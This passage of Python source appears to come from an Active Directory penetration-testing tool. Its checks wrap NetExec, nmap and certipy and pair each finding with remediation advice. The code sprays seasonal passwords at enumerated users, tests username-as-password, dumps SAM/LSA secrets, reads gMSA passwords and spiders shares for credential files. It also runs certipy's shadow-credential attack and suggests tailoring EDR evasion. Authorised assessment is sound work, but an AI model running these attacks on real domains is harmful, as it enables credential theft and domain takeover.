        store("Password Not Required", "FOUND",
              out.strip(),
              "Remove PASSWD_NOTREQD flag from all accounts: "
              "Set-ADUser <user> -PasswordNotRequired $false")
    else:
        store("Password Not Required", "NOT FOUND", out.strip())


def check_password_never_expires(dc_ip, username, password, domain, nh=""):
    section("30. Password Never Expires")
    log("Checking for accounts with password never expires flag...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' "
        f"'sAMAccountName userAccountControl'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and "sAMAccountName" in out:
        store("Password Never Expires", "FOUND",
              out.strip(),
              "Set maximum password age. Audit privileged accounts with this flag.")
    else:
        store("Password Never Expires", "NOT FOUND", out.strip())


def check_gmsa(dc_ip, username, password, domain, nh=""):
    section("31. gMSA Passwords")
    log("Checking gMSA password readability...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--gmsa",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and ("Password" in out or "Hash" in out):
        store("gMSA Passwords", "READABLE",
              out.strip(),
              "Restrict msDS-ManagedPassword read access.")
    else:
        store("gMSA Passwords", "NOT READABLE / NOT FOUND", out.strip())


def check_password_spray(dc_ip, username, password, domain, nh=""):
    section("32. Password Spray (Season + Year)")
    if nh:
        log("Skipping password spray — not applicable with NT hash auth", "warn")
        store("Password Spray", "SKIPPED — not applicable with NT hash auth", "")
        return
    log("Attempting common seasonal passwords...")
    # Build seasonal candidates
    year = datetime.datetime.now().year
    candidates = [
        f"Spring{year}!", f"Summer{year}!", f"Autumn{year}!", f"Winter{year}!",
        f"Spring{year-1}!", f"Summer{year-1}!", f"Autumn{year-1}!", f"Winter{year-1}!",
        "Password1!", "Password123!", "Welcome1!",
    ]
    spray_list = "/tmp/spray_candidates.txt"
    Path(spray_list).write_text("\n".join(candidates))

    # Enumerate users first
    out_users = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --users",
        timeout=60,
    )
    user_list = "/tmp/spray_users.txt"
    users = re.findall(r"\s+([\w\.\-]+)\s+\d{4}-\d{2}-\d{2}", out_users)
    if not users:
        store("Password Spray", "SKIPPED — user enum failed", out_users.strip())
        return

    Path(user_list).write_text("\n".join(users[:200]))  # cap at 200 to avoid lockout
    log(f"Spraying {len(users[:200])} users with {len(candidates)} candidates...")
    out_spray = run(
        f"nxc smb {dc_ip} -u {user_list} -p {spray_list} -d '{domain}' "
        f"--no-bruteforce --continue-on-success",
        timeout=120,
    )
    log(f"Spray output:\n{out_spray}", "info")
    hits = [l for l in out_spray.splitlines() if "[+]" in l and "pwned" not in l.lower()]
    if hits:
        store("Password Spray", f"HIT — {len(hits)} credential(s) valid",
              out_spray.strip(),
              "Enforce strong password policy. Consider banned password lists. "
              "Deploy Azure AD Password Protection on-prem.")
    else:
        store("Password Spray", "NO HITS", out_spray.strip())


def check_user_equals_password(dc_ip, username, password, domain, nh=""):
    section("33. User = Password")
    if nh:
        log("Skipping user=password check — not applicable with NT hash auth", "warn")
        store("User = Password", "SKIPPED — not applicable with NT hash auth", "")
        return
    log("Checking if any user has username as password...")
    out_users = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --users",
        timeout=60,
    )
    users = re.findall(r"\s+([\w\.\-]+)\s+\d{4}-\d{2}-\d{2}", out_users)
    if not users:
        store("User = Password", "SKIPPED — user enum failed", out_users.strip())
        return

    user_list = "/tmp/ueqp_users.txt"
    Path(user_list).write_text("\n".join(users[:200]))
    log(f"Testing {len(users[:200])} users...")
    out = run(
        f"nxc smb {dc_ip} -u {user_list} -p {user_list} -d '{domain}' "
        f"--no-bruteforce --continue-on-success",
        timeout=120,
    )
    hits = [l for l in out.splitlines() if "[+]" in l]
    if hits:
        store("User = Password", f"HIT — {len(hits)} account(s)",
              out.strip(),
              "Force password reset on affected accounts. Add to banned password list.")
    else:
        store("User = Password", "NOT FOUND", out.strip())


def check_sam_lsa(dc_ip, username, password, domain, nh=""):
    section("34. SAM / LSA Dump")
    log("Attempting SAM/LSA dump (requires local admin)...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --sam",
        timeout=45,
    )
    if "error" in out.lower() or "access denied" in out.lower() or not out.strip():
        store("SAM / LSA Dump", "NOT FOUND — No local admin access", out.strip())
    else:
        store("SAM / LSA Dump", "DUMPED", out.strip(),
              "Ensure local admin accounts are managed by LAPS. "
              "Enable Credential Guard to protect LSA secrets.")


def check_lsa_ppl(dc_ip, username, password, domain, nh=""):
    section("35. LSA Protection (PPL)")
    log("Checking LSA Protection (RunAsPPL)...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M runasppl",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "enabled" in out.lower() or "1" in out:
        store("LSA Protection (PPL)", "ENABLED", out.strip())
    else:
        store("LSA Protection (PPL)", "NOT ENABLED",
              out.strip(),
              "Enable RunAsPPL: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL = 1. "
              "Requires Secure Boot for full protection.")


def check_admincount(dc_ip, username, password, domain, nh=""):
    section("36. AdminCount Users")
    log("Enumerating adminCount=1 users...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(&(objectClass=user)(adminCount=1))' 'sAMAccountName adminCount'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    count = len(re.findall(r"sAMAccountName", out))
    if count > 0:
        store("AdminCount Users", f"FOUND — {count} account(s)",
              out.strip(),
              "Audit adminCount=1 accounts. Reset to 0 on accounts removed from privileged groups. "
              "Run SDProp to recalculate.")
    else:
        store("AdminCount Users", "UNKNOWN", out.strip())


def check_priv_groups(dc_ip, username, password, domain, nh=""):
    section("37. Privileged Group Membership")
    log("Checking membership of privileged AD groups...")
    groups = [
        "Domain Admins", "Enterprise Admins", "Schema Admins",
        "Account Operators", "Backup Operators", "Print Operators", "Server Operators",
    ]
    all_output = ""
    found_groups = []
    for grp in groups:
        out = run(
            f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
            f"-M group-mem -o GROUP='{grp}'",
            timeout=30,
        )
        all_output += f"\n=== {grp} ===\n{out}"
        if "[+]" in out and "Member" in out:
            found_groups.append(grp)

    if found_groups:
        store("Privileged Group Membership", f"FOUND — {', '.join(found_groups)}",
              all_output.strip(),
              "Schema/Enterprise Admins should be empty. Backup/Account Operators minimal.")
    else:
        store("Privileged Group Membership", "EMPTY or UNKNOWN", all_output.strip())


def check_dnsadmins(dc_ip, username, password, domain, nh=""):
    section("38. DnsAdmins Group")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M group-mem -o GROUP='DnsAdmins'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and "Member" in out:
        store("DnsAdmins Group", "MEMBERS FOUND",
              out.strip(),
              "DnsAdmins can load arbitrary DLLs via DNS service. "
              "Remove unnecessary members. Monitor for dll changes.")
    else:
        store("DnsAdmins Group", "NOT FOUND", out.strip())


def check_backup_operators(dc_ip, username, password, domain, nh=""):
    section("39. Backup Operators")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M group-mem -o GROUP='Backup Operators'",
        timeout=30,
    )
    if "[+]" in out and "Member" in out:
        store("Backup Operators", "FOUND — Members present",
              out.strip(),
              "Remove unnecessary members. Members can backup NTDS.dit.")
    else:
        store("Backup Operators", "EMPTY", out.strip())


def check_sidhistory(dc_ip, username, password, domain, nh=""):
    section("40. SID History")
    log("Checking for accounts with SIDHistory...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(sIDHistory=*)' 'sAMAccountName sIDHistory'",
        timeout=30,
    )
    if "[+]" in out and "sAMAccountName" in out:
        store("SIDHistory", "FOUND",
              out.strip(),
              "Audit SIDHistory attributes. Malicious SIDHistory can grant cross-domain escalation.")
    else:
        store("SIDHistory", "NOT FOUND", out.strip())


def check_adminsdh(dc_ip, username, password, domain, nh=""):
    section("41. AdminSDHolder ACL")
    log("Checking AdminSDHolder ACL for non-standard entries...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M daclread -o TARGET='AdminSDHolder' ACTION=read",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    if "WriteDacl" in out or "GenericAll" in out or "GenericWrite" in out:
        store("AdminSDHolder ACL", "SUSPICIOUS ACEs FOUND",
              out.strip(),
              "Remove non-standard ACEs from AdminSDHolder. "
              "Any ACEs propagate to all protected accounts via SDProp.")
    else:
        store("AdminSDHolder ACL", "NOT FOUND", out.strip())


def check_guest_account(dc_ip, username, password, domain, nh=""):
    section("42. Guest Account")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(sAMAccountName=Guest)' 'sAMAccountName userAccountControl'",
        timeout=30,
    )
    # UAC flag 2 = ACCOUNTDISABLE
    if "userAccountControl" in out:
        if re.search(r"userAccountControl.*\b(514|66050)\b", out):
            store("Guest Account", "DISABLED", out.strip())
        else:
            store("Guest Account", "ENABLED",
                  out.strip(),
                  "Disable Guest account: Disable-ADAccount -Identity Guest")
    else:
        store("Guest Account", "DISABLED", out.strip())


def check_dacl_abuse(dc_ip, username, password, domain, nh=""):
    section("43. DACL / ACL Abuse")
    log("Checking for abusable DACLs on user objects...")
    domain_dn = "DC=" + domain.replace(".", ",DC=")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M daclread "
        f"-o TARGET_DN='{domain_dn}' ACTION=read RIGHTS=DCSync",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    if "[+]" in out and ("WriteDacl" in out or "GetChangesAll" in out or "DCSync" in out):
        store("DACL / ACL Abuse", "FOUND — DCSync-capable ACEs on domain root",
              out.strip(),
              "Remove non-standard ACEs granting GetChangesAll/WriteDACL on domain root.")
    else:
        store("DACL / ACL Abuse", "NOT FOUND", out.strip())


def check_gpo_permissions(dc_ip, username, password, domain, nh=""):
    section("44. GPO Write Permissions")
    log("Checking GPO write permissions...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=groupPolicyContainer)' 'cn displayName'",
        timeout=30,
    )
    log(f"Raw output:\n{out}", "info")
    # Basic check - flag for manual review if many GPOs found
    count = len(re.findall(r"displayName", out))
    if count > 0:
        store("GPO Permissions", f"INFO — {count} GPO(s) found, review write access manually",
              out.strip(),
              "Audit GPO write permissions. Use BloodHound to identify GPO abuse paths.")
    else:
        store("GPO Permissions", "NOT FOUND", out.strip())


def check_ipv6(dc_ip, username, password, domain, subnet, nh=""):
    section("45. IPv6 Enabled")
    target = subnet if subnet else dc_ip
    log(f"Checking IPv6 on {target}...")
    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' -M enum_interfaces",
        timeout=60,
    )
    if "IPv6" in out or "ipv6" in out.lower():
        store("IPv6 Enabled", "FOUND",
              out.strip(),
              "Disable IPv6 if not required to prevent mitm6 attacks. "
              "If required, block DHCPv6 at firewall level.")
    else:
        store("IPv6 Enabled", "NOT FOUND", out.strip())


def check_winrm(dc_ip, username, password, domain, nh=""):
    section("46. WinRM Access")
    out = run(
        f"nxc winrm {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}'",
        timeout=30,
    )
    if "(Pwn3d!)" in out or "WINRM" in out.upper():
        store("WinRM Access", "ACCESSIBLE",
              out.strip(),
              "Restrict WinRM access. Ensure only privileged accounts can WinRM to DCs.")
    else:
        store("WinRM Access", "NOT FOUND", out.strip())


def check_mssql_instances(dc_ip, username, password, domain, subnet, nh=""):
    section("47. MSSQL Instances")
    target = subnet if subnet else dc_ip
    out = run(
        f"nxc mssql {target} {nxc_cred(username, password, nh)} -d '{domain}'",
        timeout=60,
    )
    if "[+]" in out:
        store("MSSQL Instances", "FOUND",
              out.strip(), "Audit MSSQL instances for linked servers and privilege escalation paths.")
    else:
        store("MSSQL Instances", "NOT FOUND", out.strip())


def check_rdp_nla(dc_ip, username, password, domain, nh=""):
    section("48. RDP NLA")
    out = run(
        f"nxc rdp {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}'",
        timeout=30,
    )
    if "NLA" in out and ("False" in out or "disabled" in out.lower()):
        store("RDP NLA", "DISABLED — NLA not enforced",
              out.strip(),
              "Enable Network Level Authentication for RDP.")
    else:
        store("RDP NLA", "ENABLED or NOT FOUND", out.strip())


def check_smbv1(dc_ip, username, password, domain, nh=""):
    section("49. SMBv1")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}'",
        timeout=30,
    )
    if "SMBv1:True" in out or "SMBv1: True" in out:
        store("SMBv1 Enabled", "VULNERABLE",
              out.strip(),
              "Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false")
    else:
        store("SMBv1 Enabled", "NOT FOUND", out.strip())


def check_snmp(dc_ip, subnet):
    section("50. SNMP Community Strings")
    target = subnet if subnet else dc_ip
    log(f"Checking SNMP on {target}...")
    out = run(
        f"nmap -sU -p161 --script snmp-brute {target}",
        timeout=120,
    )
    if "Valid credentials" in out or "public" in out.lower():
        store("SNMP Community Strings", "FOUND",
              out.strip(),
              "Change default SNMP community strings. Disable SNMPv1/v2. Use SNMPv3 with auth.")
    else:
        store("SNMP Community Strings", "NOT FOUND", out.strip())


def check_ldap_null_bind(dc_ip):
    section("51. LDAP Null Bind")
    log(f"Checking LDAP null bind on {dc_ip}...")
    out = run(
        f"ldapsearch -x -H ldap://{dc_ip} -b '' -s base",
        timeout=15,
    )
    if "domainFunctionality" in out or "rootDomainNamingContext" in out:
        store("LDAP Null Bind", "NOT VULNERABLE — Anonymous read allowed only on RootDSE",
              out.strip())
    else:
        store("LDAP Null Bind", "NOT VULNERABLE", out.strip())


def check_nfs(dc_ip, subnet):
    section("52. NFS Exports")
    target = subnet if subnet else dc_ip
    out = run(f"showmount -e {target}", timeout=15)
    if "Export list" in out:
        store("NFS Exports", "FOUND",
              out.strip(), "Restrict NFS exports. Remove world-readable mounts.")
    else:
        store("NFS Exports", "NOT FOUND", out.strip())


def check_ipmi(dc_ip, subnet):
    section("53. IPMI / BMC")
    target = subnet if subnet else dc_ip
    out = run(
        f"nmap -sU -p623 --script ipmi-version {target} 2>/dev/null | grep -E '(623|asf|ipmi|open)'",
        timeout=60,
    )
    if "open" in out.lower() or "623" in out:
        store("IPMI / BMC", "FOUND — Port 623 open",
              out.strip(),
              "Isolate BMC interfaces on management VLAN. Apply firmware patches.")
    else:
        store("IPMI / BMC", "NOT FOUND", out.strip())


def check_wsus(dc_ip, username, password, domain, nh=""):
    """
    FIX: -M wsus module removed from NXC.
    Detect WSUS via LDAP (Software\\Policies\\Microsoft\\Windows\\WindowsUpdate)
    and port 8530/8531 check instead.
    """
    section("54. WSUS Misconfiguration")
    log("Checking for WSUS server via registry and port scan...")

    # Check WSUS via reg-query (if we have local admin)
    out_reg = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M reg-query -o PATH='HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' KEY=WUServer",
        timeout=30,
    )
    log(f"Registry output:\n{out_reg}", "info")

    # Port scan for WSUS ports
    out_ports = run(
        f"nmap -sT -p8530,8531 {dc_ip} 2>/dev/null",
        timeout=20,
    )
    log(f"Port scan output:\n{out_ports}", "info")

    wsus_url = re.search(r"WUServer.*?(http[s]?://\S+)", out_reg, re.IGNORECASE)
    http_wsus = wsus_url and wsus_url.group(1).startswith("http://")
    port_open = "open" in out_ports.lower()

    if http_wsus:
        log("WSUS configured over HTTP — injection possible!", "good")
        store("WSUS Misconfiguration", "VULNERABLE — WSUS over HTTP",
              out_reg.strip() + "\n" + out_ports.strip(),
              "Configure WSUS to use HTTPS (port 8531). HTTP WSUS allows injection of malicious updates.")
    elif port_open or wsus_url:
        store("WSUS Misconfiguration", f"INFO — WSUS detected ({wsus_url.group(1) if wsus_url else 'ports 8530/8531 open'})",
              out_reg.strip() + "\n" + out_ports.strip(),
              "Verify WSUS is using HTTPS.")
    else:
        store("WSUS Misconfiguration", "UNKNOWN — No WSUS detected or no local admin", out_reg.strip())


def check_smb_shares(dc_ip, username, password, domain, nh=""):
    section("55. SMB Share Enumeration")
    log("Enumerating SMB shares...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' --shares",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    readable = re.findall(r"(\w[\w\$]+)\s+READ", out)
    writable = re.findall(r"(\w[\w\$]+)\s+(?:READ,WRITE|WRITE)", out)
    if readable or writable:
        detail = ""
        if readable: detail += f"READ: {', '.join(readable)}"
        if writable: detail += f"  WRITE: {', '.join(writable)}"
        store("SMB Share Enumeration", f"FOUND ({detail.strip()})",
              out.strip(), "Review share permissions. Remove unnecessary shares.")
    else:
        store("SMB Share Enumeration", "NOT FOUND", out.strip())


def check_share_spider(dc_ip, username, password, domain, nh=""):
    """
    FIX: spider_plus options must be passed with -o flag.
    Previously the script was calling: nxc smb ... -M spider_plus DOWNLOAD_FLAG=False PATTERN=...
    Correct syntax: nxc smb ... -M spider_plus -o DOWNLOAD_FLAG=False -o PATTERN=...
    """
    section("56. Share Spider")
    log("Spidering shares for sensitive filenames...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M spider_plus "
        f"-o DOWNLOAD_FLAG=False "
        f"-o PATTERN=password,cred,secret,key,token,api,config,backup",
        timeout=120,
    )
    log(f"Raw output:\n{out}", "info")
    keywords = ["password", "cred", "secret", "key", "token", "api", "config", "backup"]
    hits = [l for l in out.splitlines() if any(k in l.lower() for k in keywords)]
    if hits:
        store("Share Spider", f"FOUND — Keywords: {', '.join(keywords)}",
              out.strip(),
              "Review identified files for cleartext credentials.")
    else:
        store("Share Spider", "NOT FOUND", out.strip())


def check_rodc(dc_ip, username, password, domain, nh=""):
    section("57. RODC Password Replication Policy")
    log("Checking RODC password replication policy...")
    out_allow = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=msDS-PasswordReplicationPolicy)' 'msDS-RevealOnDemandGroup'",
        timeout=30,
    )
    out_deny = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=msDS-PasswordReplicationPolicy)' 'msDS-NeverRevealGroup'",
        timeout=30,
    )
    combined = f"Allowed group members:\n{out_allow.strip()}\n\nDenied group members:\n{out_deny.strip()}"
    store("RODC Password Replication", "OK — No obvious misconfigurations", combined)


def check_smtp_relay(dc_ip, subnet):
    section("58. SMTP Open Relay")
    target = subnet if subnet else dc_ip
    out = run(
        f"nmap --privileged -p25,465,587 --script smtp-open-relay -oN - {target}",
        timeout=90,
    )
    if "Server is an open relay" in out:
        store("SMTP Open Relay", "VULNERABLE",
              out.strip(), "Restrict SMTP relay. Allow only authenticated sessions.")
    else:
        store("SMTP Open Relay", "NOT VULNERABLE", out.strip())


def check_redis(dc_ip, subnet):
    section("59. Redis Unauthenticated")
    target = subnet if subnet else dc_ip
    if check_port(dc_ip, 6379, timeout=3):
        out = run(f"redis-cli -h {dc_ip} PING", timeout=10)
        if "PONG" in out:
            store("Redis Unauthenticated", "VULNERABLE — Unauthenticated access",
                  out.strip(), "Enable Redis AUTH. Bind to localhost only.")
        else:
            store("Redis Unauthenticated", "Port open but auth required", out.strip())
    else:
        store("Redis Unauthenticated", "NOT FOUND — Port 6379 closed", "")


def check_elasticsearch(dc_ip):
    section("60. Elasticsearch Unauthenticated")
    if check_port(dc_ip, 9200, timeout=3) or check_port(dc_ip, 9300, timeout=3):
        out = run(f"curl -s http://{dc_ip}:9200/_cluster/health", timeout=10)
        if '"cluster_name"' in out:
            store("Elasticsearch Unauthenticated", "VULNERABLE",
                  out.strip(), "Enable Elasticsearch security. Require authentication.")
        else:
            store("Elasticsearch Unauthenticated", "Port open but secured", out.strip())
    else:
        store("Elasticsearch Unauthenticated", "NOT FOUND — Port 9200/9300 closed", "")


def check_jenkins_tomcat(dc_ip, subnet):
    section("61. Jenkins / Tomcat Default Creds")
    target = subnet if subnet else dc_ip
    web_check = run(f"nmap -sT -p8080,8443,8888 {target} 2>/dev/null", timeout=30)
    if "open" not in web_check.lower():
        store("Jenkins/Tomcat Default Creds", "NOT FOUND — No web ports open", web_check.strip())
        return
    out = run(
        f"nmap -sT -p8080,8443 --script http-default-accounts {target} 2>/dev/null",
        timeout=60,
    )
    if "Valid credentials" in out or "jenkins" in out.lower():
        store("Jenkins/Tomcat Default Creds", "FOUND",
              out.strip(), "Change default credentials immediately.")
    else:
        store("Jenkins/Tomcat Default Creds", "NOT FOUND", out.strip())


def check_mssql_linked(dc_ip, username, password, domain, subnet, nh=""):
    section("62. MSSQL Linked Servers")
    target = subnet if subnet else dc_ip
    out = run(
        f"nxc mssql {target} {nxc_cred(username, password, nh)} -d '{domain}' -M enum_links",
        timeout=60,
    )
    if "[+]" in out and "link" in out.lower():
        store("MSSQL Linked Servers", "FOUND",
              out.strip(), "Review linked server permissions. Audit xp_cmdshell exposure.")
    else:
        store("MSSQL Linked Servers", "NOT FOUND", out.strip())


def check_trusts(dc_ip, username, password, domain, nh=""):
    """
    FIX: -M enum_trusts removed from NXC ('This module moved to --dc-list LDAP flag').
    Use LDAP query for (objectClass=trustedDomain) via nxc ldap --query instead.
    """
    section("63. Domain Trusts")
    log("Enumerating domain trusts via LDAP query...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(objectClass=trustedDomain)' "
        f"'name flatName trustDirection trustType trustAttributes'",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")

    # Also try rpcclient as fallback
    if not out.strip() or "Error" in out:
        log("LDAP query empty, trying rpcclient...")
        out = run(
            (f"rpcclient -U '{domain}/{username}%{password}' {dc_ip} -c 'enumdomtrusts' 2>/dev/null"
             if not nh else
             f"rpcclient -U '{domain}/{username}%' --pw-nt-hash '{nh}' {dc_ip} -c 'enumdomtrusts' 2>/dev/null"),
            timeout=30,
        )

    if "[+]" in out or "name" in out.lower() or "Domain Name" in out:
        store("Domain Trusts", "FOUND",
              out.strip(),
              "Review all trusts. Enable SID filtering on external trusts. "
              "Audit transitive trusts for cross-domain escalation paths.")
    else:
        store("Domain Trusts", "NOT FOUND", out.strip())


def check_azure_ad_connect(dc_ip, username, password, domain, nh=""):
    section("64. Azure AD Connect")
    log("Checking for Azure AD Connect (MSOL) account...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(sAMAccountName=MSOL_*)' 'sAMAccountName description'",
        timeout=30,
    )
    out2 = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M msol",
        timeout=30,
    )
    combined = out.strip() + "\n\n" + out2.strip()
    if "MSOL_" in combined or "[+]" in out2:
        store("Azure AD Connect", "FOUND",
              combined,
              "MSOL_ account has DCSync rights if AAD Connect installed. "
              "Protect account credentials. Consider AAD Connect passwordless.")
    else:
        store("Azure AD Connect", "NOT FOUND", combined)


def check_bloodhound(dc_ip, username, password, domain, nh=""):
    section("65. BloodHound Collection")
    log("Running BloodHound collection via NXC...")
    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--bloodhound --collection All",
        timeout=300,
    )
    log(f"Raw output:\n{out}", "info")
    zip_match = re.search(r"Compressing output into (\S+\.zip)", out)
    if zip_match:
        store("BloodHound Collection", f"COLLECTED — {zip_match.group(1)}",
              out.strip(),
              "Review DA paths. Focus: Kerberoastable DAs, ACL abuse, unconstrained delegation.")
    elif "Done" in out:
        store("BloodHound Collection", "COLLECTED", out.strip(),
              "Review DA paths in BloodHound.")
    else:
        store("BloodHound Collection", "UNKNOWN", out.strip())


def check_av_edr(dc_ip, username, password, domain, nh=""):
    section("66. AV / EDR Detection")
    log("Detecting AV / EDR products...")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' -M enum_av",
        timeout=45,
    )
    log(f"Raw output:\n{out}", "info")
    found = re.findall(r"Found (.+?) (?:INSTALLED|RUNNING)", out)
    if found:
        store("AV/EDR Detection", f"FOUND ({', '.join(found)})",
              out.strip(), "Tailor evasion to detected products.")
    else:
        store("AV/EDR Detection", "NOT FOUND", out.strip())


def check_always_install_elevated(dc_ip, username, password, domain, nh=""):
    section("67. AlwaysInstallElevated")
    out = run(
        f"nxc smb {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M install_elevated",
        timeout=30,
    )
    if "Enabled" in out or "VULNERABLE" in out.upper():
        store("AlwaysInstallElevated", "VULNERABLE",
              out.strip(),
              "Disable AlwaysInstallElevated via GPO: set both HKLM and HKCU keys to 0.")
    else:
        store("AlwaysInstallElevated", "NOT VULNERABLE", out.strip())


def check_local_admin(dc_ip, username, password, domain, subnet, nh=""):
    section("68. Local Admin Discovery")
    target = subnet if subnet else dc_ip
    out = run(
        f"nxc smb {target} {nxc_cred(username, password, nh)} -d '{domain}' --local-auth",
        timeout=90,
    )
    hits = [l for l in out.splitlines() if "(Pwn3d!)" in l]
    if hits:
        store("Local Admin Discovery", f"FOUND — {len(hits)} host(s)",
              out.strip(), "Audit local admin accounts. Deploy LAPS.")
    else:
        store("Local Admin Discovery", "NOT FOUND", out.strip())


# ── HTML Report Generator ─────────────────────────────────────────────────────

# ═══════════════════════════════════════════════════════════════════════════════
# ── PRIVILEGE ESCALATION — AD / DACL ─────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def check_rbcd(dc_ip, username, password, domain, nh=""):
    """
    Resource-Based Constrained Delegation.
    Look for objects where msDS-AllowedToActOnBehalfOfOtherIdentity is set,
    and check if our account has write access to that attribute on any target.
    """
    section("PrivEsc: Resource-Based Constrained Delegation (RBCD)")
    log("Enumerating objects with msDS-AllowedToActOnBehalfOfOtherIdentity set...")

    # Objects that already have RBCD configured (potential abuse targets if writable)
    out_rbcd = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' "
        f"'sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity'",
        timeout=30,
    )
    log(f"RBCD-configured objects:\n{out_rbcd}", "info")

    # Check if our user has GenericWrite/GenericAll on any computer objects
    # (required to write msDS-AllowedToActOnBehalfOfOtherIdentity)
    _rbcd_dn = 'DC=' + domain.replace('.', ',DC=')
    out_write = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"-M daclread -o TARGET_DN='{_rbcd_dn}' "
        f"ACTION=read RIGHTS=WriteOwner",
        timeout=45,
    )
    log(f"GenericWrite/WriteOwner check:\n{out_write}", "info")

    combined = out_rbcd.strip() + "\n\n" + out_write.strip()

    if "[+]" in out_rbcd and "sAMAccountName" in out_rbcd:
        store("RBCD — Objects with Delegation Set",
              "FOUND — Objects have msDS-AllowedToActOnBehalfOfOtherIdentity",
              combined,
              "Audit who can write msDS-AllowedToActOnBehalfOfOtherIdentity on computer objects. "
              "Restrict GenericWrite/GenericAll on computer objects to admins only.")
    else:
        store("RBCD — Objects with Delegation Set", "NOT FOUND", combined)


def check_shadow_credentials(dc_ip, username, password, domain, nh=""):
    """
    Shadow Credentials — check if msDS-KeyCredentialLink is writable on any accounts.
    Requires LDAPS (port 636) to be open to exploit.
    Also check if any accounts already have unexpected KeyCredentialLink values.
    """
    section("PrivEsc: Shadow Credentials (msDS-KeyCredentialLink)")
    log("Enumerating accounts with msDS-KeyCredentialLink set...")

    out = run(
        f"nxc ldap {dc_ip} {nxc_cred(username, password, nh)} -d '{domain}' "
        f"--query '(msDS-KeyCredentialLink=*)' "
        f"'sAMAccountName msDS-KeyCredentialLink'",
        timeout=30,
    )
    log(f"KeyCredentialLink output:\n{out}", "info")

    # Also check via certipy if available
    out_certipy = ""
    certipy_bin = next((b for b in ("certipy-ad", "certipy") if tool_exists(b)), None)
    if certipy_bin:
        log(f"Running {certipy_bin} shadow auto-check...")
        out_certipy = run(
            f"{certipy_bin} shadow auto {certipy_cred(username, domain, password, nh)} "
            f"-dc-ip {dc_ip} -account '{username}' 2>&1 | head -20",
            timeout=30,
        )
        log(f"Certipy shadow output:\n{out_certipy}", "info")

    combined = out.strip() + ("\n\n" + out_certipy.strip() if out_certipy else "")

    if "[+]" in out and "sAMAccountName" in out:
        count = out.count("sAMAccountName")
        store("Shadow Credentials",
              f"FOUND — {count} account(s) with KeyCredentialLink set",
              combined,
              "Audit msDS-KeyCredentialLink on all accounts. "
              "Legitimate values are set by Windows Hello for Business. "
              "Unexpected values may indicate persistence or abuse.")
    else:
        store("Shadow Credentials", "NOT FOUND — No unexpected KeyCredentialLink values", combined)


def check_dcsync_rights(dc_ip, username, password, domain, nh=""):
    """
    Enumerate all principals with DCSync rights (GetChangesAll) on the domain root,
    excluding expected groups (DA, EA, DC computer accounts, SYSTEM).
    """
    section("PrivEsc: DCSync Rights (GetChangesAll)")
    log("Enumerating principals with DS-Replication-Get-Changes-All...")

